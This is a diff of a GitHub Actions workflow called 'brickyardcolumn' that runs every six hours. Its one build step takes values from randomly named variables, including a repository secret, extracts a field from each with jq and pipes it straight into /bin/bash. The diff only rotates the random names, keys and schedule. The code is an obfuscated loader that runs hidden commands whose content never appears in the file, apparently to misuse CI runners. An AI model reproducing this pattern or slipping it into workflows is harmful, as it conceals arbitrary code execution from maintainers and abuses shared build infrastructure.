@@ -3,29 +3,27 @@ name: brickyardcolumn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 5/6 * * *'
-jobs:  # 22644
+    - cron: '23 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: brickyardcolumn
         env:
-          foyl055: ${{ secrets.foyl055 }}
+          ua302: ${{ secrets.ua302 }}
         run: |
-          echo $foyl055 | jq -r .gk34 | /bin/bash
-          echo $u67 | jq -r .jzsrd91434 | /bin/bash
-          echo $ig5543 | jq -r .bxr1 | /bin/bash
-          echo $pnj29329 | jq -r .cl1 | /bin/bash
-          echo $zw204 | jq -r .z549 | /bin/bash
-          echo $v1208 | jq -r .sbkgo1 | /bin/bash
-          echo $zl7 | jq -r .aib7163 | /bin/bash
-          echo $vlu1 | jq -r .nszq00508 | /bin/bash
-          echo $hq36511 | jq -r .evrgw49 | /bin/bash
-          echo $wkyr224 | jq -r .aoes7109 | /bin/bash
-          echo $z374 | jq -r .mgaw80597 | /bin/bash
-          echo $tbyl15294 | jq -r .a85 | /bin/bash
-          echo $ajzms41 | jq -r .x0 | /bin/bash
-          echo $r2 | jq -r .qyh05277 | /bin/bash
-          echo $rysqb6917 | jq -r .tzkhn61358 | /bin/bash
+          echo $ua302 | jq -r .lerow3 | /bin/bash
+          echo $n08222 | jq -r .d8 | /bin/bash
+          echo $r070 | jq -r .peqxm97571 | /bin/bash
+          echo $y16 | jq -r .k0 | /bin/bash
+          echo $l9067 | jq -r .msui4905 | /bin/bash
+          echo $b4 | jq -r .e28050 | /bin/bash
+          echo $tmzr320 | jq -r .dwhy375 | /bin/bash
+          echo $vd4965 | jq -r .d4400 | /bin/bash
+          echo $o3096 | jq -r .kfikx18 | /bin/bash
+          echo $wtsj8758 | jq -r .nhvy65 | /bin/bash
+          echo $n063 | jq -r .siyw8129 | /bin/bash
+          echo $rzf47140 | jq -r .bk42005 | /bin/bash
 
